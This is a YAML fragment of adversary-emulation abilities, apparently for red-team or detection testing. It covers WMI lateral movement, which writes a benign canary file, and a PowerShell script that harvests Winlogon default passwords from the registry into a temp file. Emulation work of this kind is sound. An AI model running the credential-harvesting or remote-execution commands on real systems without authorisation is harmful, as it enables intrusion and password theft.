- id: b27f31a4-9e8c-4f7d-a1b2-5c6d4e8f9a0b
  name: WMI Lateral Movement
  description: >
    Use wmic to execute a command on a remote target defined by a dynamic fact source.
    The remote command is benign (writes a canary file) for safe emulation.
  tactic: lateral-movement
  technique:
    attack_id: T1047
    name: "Windows Management Instrumentation"
  cti_source: "AttackIQ Intelligence"
  procedure_group: procedure_lateral_movement
  procedure_step: "3.A"
  platforms:
    windows:
      cmd:
        command: |
          wmic /node:#{target.remote.node} process call create "cmd.exe /c echo WMI_Lateral_Test > C:\Windows\Temp\wmi_canary.txt"
  executors:
  - name: command_prompt
    command: |
      wmic /node:#{target.remote.node} process call create "cmd.exe /c echo WMI_Lateral_Test > C:\Windows\Temp\wmi_canary.txt"

# ------------------------------------------------------------
# Step 4: Credential Access
# ------------------------------------------------------------

- id: e8c459b2-3f1d-4a7e-9b6c-8a2f1d5e4c3b
  name: Search Registry for Hardcoded Passwords
  description: >
    Use PowerShell to search for DefaultPassword and AltDefaultPassword values
    in common registry locations. Output is saved to a file for simulated exfil.
  tactic: credential-access
  technique:
    attack_id: T1552.002
    name: "Unsecured Credentials: Credentials in Registry"
  cti_source: "AttackIQ Intelligence"
  procedure_group: procedure_credential_access
  procedure_step: "4.A"
  platforms:
    windows:
      psh,pwsh:
        command: |
          $keys = @(
            "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\Parameters",
            "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
          )
          $results = @()
          foreach ($key in $keys) {
            if (Test-Path $key) {
              $props = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
              if ($props.DefaultPassword) {
                $results += "$key -> DefaultPassword: $($props.DefaultPassword)"
              }
              if ($props.AltDefaultPassword) {
                $results += "$key -> AltDefaultPassword: $($props.AltDefaultPassword)"
              }
            }
          }
          $results | Out-File -FilePath C:\Windows\Temp\registry_creds.txt -Encoding utf8
  executors:
  - name: powershell
    command: |
      $keys = @(
        "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\Parameters",
        "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
      )
      $results = @()
      foreach ($key in $keys) {
        if (Test-Path $key) {
          $props = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
          if ($props.DefaultPassword) {
            $results += "$key -> DefaultPassword: $($props.DefaultPassword)"
          }
          if ($props.AltDefaultPassword) {
            $results += "$key -> AltDefaultPassword: $($props.AltDefaultPassword)"
          }
        }
      }
      $results | Out-File -FilePath C:\Windows\Temp\registry_creds.txt -Encoding utf8

